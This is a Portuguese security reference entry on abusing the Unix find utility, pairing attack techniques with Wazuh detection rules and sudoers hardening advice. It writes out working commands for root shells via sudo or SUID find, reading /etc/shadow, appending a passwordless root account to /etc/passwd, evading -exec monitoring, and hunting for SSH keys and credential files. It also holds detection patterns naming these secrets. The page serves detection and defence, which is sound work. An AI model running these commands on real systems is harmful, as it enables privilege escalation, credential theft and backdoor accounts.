# find

**Plataforma:** Linux / macOS / Unix

**Categorias:** Execução de código, Leitura de arquivos, Escalada de privilégios (SUID/sudo)

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1548.001 (SUID/SGID), T1083 (File and Directory Discovery)

**Referência ofensiva:** https://gtfobins.org/gtfobins/find/

---

## O que é o find

O find é um utilitário de linha de comando para busca de arquivos e diretórios em sistemas de arquivos, com suporte a uma ampla variedade de critérios: nome, tipo, tamanho, data de modificação, permissões, dono, e muito mais. É uma das ferramentas mais utilizadas em scripts de administração de sistemas em Unix.

O que o torna especialmente interessante do ponto de vista ofensivo é a flag `-exec`, que permite executar um comando arbitrário para cada arquivo encontrado. Combinada com o bit SUID ou com permissões sudo mal configuradas, essa flag transforma o find em um vetor direto de escalada de privilégios.

---

## Por que atacantes usam o find

O find resolve dois problemas distintos: descoberta de informações (buscar arquivos sensíveis no sistema) e execução de comandos com privilégios elevados (quando executado via sudo ou com SUID). A fase de reconhecimento interno — mapear o sistema em busca de arquivos de configuração, chaves SSH, credenciais e backups — frequentemente usa o find. E a escalada de privilégios via sudo find é uma das entradas mais comuns em listas de configurações incorretas de sudoers.

---

## Técnicas de abuso

### Execução de comando via -exec (sudo abuse)

Se um usuário pode executar o find via sudo (sem restrição de argumentos), a escalada é imediata:

```bash
# Se o sudoers contém: user ALL=(ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \; -quit

# Versão mais silenciosa (busca um arquivo que existe)
sudo find /etc/passwd -exec /bin/bash \; -quit

# Obter shell root via -exec sh
sudo find / -name "*.log" -exec /bin/sh \; -quit
```

A flag `-quit` faz o find parar após a primeira execução, o que é mais limpo — sem ela, o find continuaria executando o shell para cada arquivo encontrado.

### Abuso de SUID no find

Se o binário find tiver o bit SUID ativo (erro de configuração ou backdoor):

```bash
# Verificar se find tem SUID
find / -name find -perm -4000 2>/dev/null

# Executar shell como root via -exec
./find / -exec /bin/bash -p \; -quit
```

A flag `-p` no bash é necessária para preservar o UID efetivo elevado, conforme discutido na entrada do bash.

### Reconhecimento — busca de arquivos sensíveis

O find é a ferramenta padrão para varredura de arquivos em pós-exploração:

```bash
# Encontrar arquivos de configuração com credenciais
find / -name "*.conf" -readable 2>/dev/null
find / -name "*.env" -readable 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name "database.yml" 2>/dev/null
find / -name ".htpasswd" 2>/dev/null

# Encontrar chaves SSH privadas
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null

# Encontrar todos os arquivos modificados nas últimas 24 horas (rastrear atividade recente)
find / -mtime -1 -type f 2>/dev/null

# Encontrar arquivos com permissão de escrita para o usuário atual
find / -writable -type f 2>/dev/null

# Encontrar todos os binários SUID no sistema
find / -perm -4000 -type f 2>/dev/null

# Encontrar todos os binários SGID
find / -perm -2000 -type f 2>/dev/null

# Encontrar arquivos de backup
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
```

### Leitura de arquivos via -exec cat

```bash
# Ler arquivo específico via find + cat (útil quando o find tem SUID mas o cat não)
find /etc/shadow -exec cat {} \;

# Ler múltiplos arquivos sensíveis
find /root -type f -exec cat {} \;
```

### Escrita de arquivos via -exec tee

```bash
# Escrever em arquivo via find + tee (com SUID no find)
echo "root2::0:0:root:/root:/bin/bash" | find /etc/passwd -exec tee -a {} \;
```

---

## Técnicas de bypass e evasão

### Substituição de -exec por -execdir

Em alguns sistemas, políticas de segurança monitoram o uso de `-exec`. A flag `-execdir` tem comportamento similar e pode passar despercebida por regras menos sofisticadas.

```bash
# -execdir executa o comando no diretório do arquivo encontrado
sudo find / -execdir /bin/bash \; -quit
```

### Uso de ponto e vírgula vs. sinal de mais

```bash
# -exec cmd {} ; executa o comando uma vez por arquivo
# -exec cmd {} + executa o comando uma vez com todos os arquivos como argumentos
# Ambas as formas são funcionais para o bypass
sudo find / -name passwd -exec /bin/bash \; -quit
sudo find /etc -exec /bin/bash {} +
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- find com `-exec` executando `/bin/bash`, `/bin/sh` ou outro interpretador
- find executado via sudo combinado com `-exec`
- find com SUID ativo fora do caminho padrão do sistema
- find com `-exec` escrevendo em arquivos críticos (`/etc/passwd`, `/etc/sudoers`, `/root/.ssh/authorized_keys`)

**Indicadores de média relevância:**

- find em varredura de todo o sistema (`/` como ponto de partida) por processo não-root
- find buscando extensões sensíveis (`.pem`, `.key`, `id_rsa`, `.env`)
- find com `-perm -4000` (busca de binários SUID — reconhecimento de privesc)

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0101-gtfobins_execution.xml -->

<!-- find com -exec executando shell -->
<rule id="100222" level="14">
  <if_group>auditd</if_group>
  <field name="audit.command">find</field>
  <field name="audit.execve" type="pcre2">-exec.*(bash|/sh|python|perl)</field>
  <description>find com -exec executando interpretador — possivel escalada de privilegios via sudo ou SUID</description>
  <mitre>
    <id>T1059.004</id>
    <id>T1548.001</id>
  </mitre>
</rule>

<!-- find buscando binários SUID (reconhecimento de escalada) -->
<rule id="100223" level="10">
  <if_group>auditd</if_group>
  <field name="audit.command">find</field>
  <field name="audit.execve" type="pcre2">-perm.*[42]000|-perm.*-4000|-perm.*-2000</field>
  <description>find buscando binarios SUID/SGID — reconhecimento de vetor de escalada de privilegios</description>
  <mitre>
    <id>T1083</id>
    <id>T1548.001</id>
  </mitre>
</rule>

<!-- find buscando arquivos sensíveis (chaves, credenciais) -->
<rule id="100224" level="10">
  <if_group>auditd</if_group>
  <field name="audit.command">find</field>
  <field name="audit.execve" type="pcre2">id_rsa|id_ed25519|\.pem|\.key|\.env|password|passwd|shadow|\.htpasswd</field>
  <description>find buscando arquivos sensiveis — possivel reconhecimento pos-exploracao</description>
  <mitre>
    <id>T1083</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Scripts de auditoria de segurança legítimos** — ferramentas como Lynis e scripts de hardening usam find para buscar binários SUID e arquivos de configuração. Filtre pelo usuário root em contexto de janela de manutenção ou pelo processo pai (scripts de auditoria conhecidos).

**Sistemas de backup** — Bacula, Amanda e scripts de backup customizados usam find intensivamente para localizar arquivos a serem copiados. Filtre pelo usuário de serviço do backup e pela ausência de `-exec` com shells.

**Administradores em troubleshooting** — uso manual do find por administradores em sessões SSH interativas é esperado. Concentre alertas de alto nível na combinação find + `-exec` + shell, não no find isolado.

---

## Proteção e controles defensivos

**Auditar o sudoers regularmente:** nenhum usuário não-root deveria ter permissão de executar find via sudo sem restrições de argumento. Execute `visudo` ou analise `/etc/sudoers.d/` para identificar entradas como `NOPASSWD: /usr/bin/find`.

**Monitorar SUID em find:** `find / -name find -perm -4000 2>/dev/null` deve sempre retornar vazio. Implemente esta verificação como check periódico via Wazuh ou script de auditoria.

**Princípio do menor privilégio em sudoers:** se há necessidade operacional de dar acesso ao find via sudo, restrinja os argumentos usando `Cmnd_Alias` com argumentos específicos e use `NOEXEC` tag para prevenir a execução de subprocessos.

---

## Referências

- GTFOBins — find: https://gtfobins.org/gtfobins/find/
- MITRE ATT&CK T1548.001: https://attack.mitre.org/techniques/T1548/001/
- MITRE ATT&CK T1083: https://attack.mitre.org/techniques/T1083/
